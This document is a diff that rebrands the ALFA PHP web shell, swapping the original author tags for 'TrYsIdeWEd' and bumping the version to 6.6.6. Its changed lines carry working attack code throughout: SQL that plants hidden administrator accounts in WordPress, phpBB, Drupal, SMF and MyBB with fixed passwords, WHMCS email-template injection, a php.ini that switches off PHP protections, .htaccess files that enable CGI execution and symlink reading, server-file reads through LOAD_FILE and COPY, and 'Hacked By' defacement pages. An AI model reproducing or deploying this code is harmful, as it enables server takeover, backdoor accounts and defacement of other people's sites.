@@ -170,7 +170,7 @@ if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemod
 if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
 if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
-define("__ALFA_VERSION__", "4.1");
+define("__ALFA_VERSION__", "6.6.6");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "TrYsIdeWEd");
 define("__TrYsIdeWEd_FOLDER__", "TrYsIdeWEd");
@@ -1888,7 +1888,7 @@ $tempSave = str_replace("'","\'",$tempSave1);
 mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
 $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
 $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
+$create = "insert into tblclients (email) values('TrYsIdeWEd@fbi.gov')";
 $result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version') && $method == 'auto'){
 $AlfaSole = new AlfaCURL(true);
@@ -3428,7 +3428,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By TrYsIdeWEd</title><b>Hacked By TrYsIdeWEd</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
@@ -3452,7 +3452,7 @@ $tempSave1 = $soleGet['message'];
 $tempSave = str_replace("'","\'",$tempSave1);
 $inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
 $result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
+$create = "insert into tblclients (email) values('TrYsIdeWEd@fbi.gov')";
 $result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version')){
 $AlfaSole = new AlfaCURL(true);
@@ -3485,10 +3485,10 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By TrYsIdeWEd</title><b>Hacked By TrYsIdeWEd</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
-$s0levisible="Powered By Solevisible";
+$s0levisible="Powered By TrYsIdeWEd";
 $dbu = $_POST['alfa2'];
 $dbn = $_POST['alfa3'];
 $dbp = $_POST['alfa4'];
@@ -3529,7 +3529,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By TrYsIdeWEd</title><b>Hacked By TrYsIdeWEd</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
 $mybb_dbh = $_POST['alfa6'];
 $mybb_dbu = $_POST['alfa7'];
@@ -3674,7 +3674,7 @@ if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(ALFA TEaM)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By TrYsIdeWEd");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@@ -3894,9 +3894,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
@@ -3916,7 +3916,7 @@ if ($sole == 1){
 $solevis = @mysqli_fetch_assoc($solevisible);
 $res = $solevis['ID'];
 }
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible'),(null,'".$res."','last_name','solevisible'),(null,'".$res."','nickname','solevisible'),(null,'".$res."','description','solevisible'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','TrYsIdeWEd'),(null,'".$res."','last_name','TrYsIdeWEd'),(null,'".$res."','nickname','TrYsIdeWEd'),(null,'".$res."','description','TrYsIdeWEd'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
@@ -3936,9 +3936,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -3979,9 +3979,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4030,9 +4030,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4045,7 +4045,7 @@ $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$hash = md5('solevisible');
+$hash = md5('TrYsIdeWEd');
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type= 3") or die(mysqli_error($conn));
@@ -4070,9 +4070,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4105,9 +4105,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4141,9 +4141,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'TrYsIdeWEd@fbi.gov', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4175,7 +4175,7 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true)
  );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4190,7 +4190,7 @@ $getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit
 $getDescuid = @mysqli_fetch_assoc($getDescuid);
 $getDescuid = $getDescuid['uid'];
 $getdescuid = $getDescuid++;
-$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','TrYsIdeWEd@fbi.gov','filtered_html','1','Europe/Berlin','TrYsIdeWEd@fbi.gov')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
 $sole = mysqli_num_rows($solevisible);
 if ($sole == 1){
@@ -4219,7 +4219,7 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'TrYsIdeWEd', 'inputSize' => '50', 'disabled' => true),
  );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4231,8 +4231,8 @@ $password = $_POST['alfa6'];
 $prefix = $_POST['alfa7'];
 $admin = $_POST['alfa8'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$setpwAlg = sha1(strtolower($admin) . 'solevisible');
-$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisible@fbi.gov')") or die(mysqli_error($conn));
+$setpwAlg = sha1(strtolower($admin) . 'TrYsIdeWEd');
+$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','TrYsIdeWEd@fbi.gov')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
@@ -4653,11 +4653,11 @@ case 'mysql':
 return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
 break;
 case 'pgsql':
-$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes($str)."';select file from solevisible;");
+$this->query("CREATE TABLE TrYsIdeWEd(file text);COPY TrYsIdeWEd FROM '".addslashes($str)."';select file from TrYsIdeWEd;");
 $r=array();
 while($i=$this->fetch())
 $r[] = $i['file'];
-$this->query('drop table solevisible');
+$this->query('drop table TrYsIdeWEd');
 return array('file'=>implode("\n",$r));
 break;
 }
@@ -5222,9 +5222,9 @@ function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
+$code = "#Coded By TrYsIdeWEd\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
 }elseif($m=='sym'){
-$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By TrYsIdeWEd\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
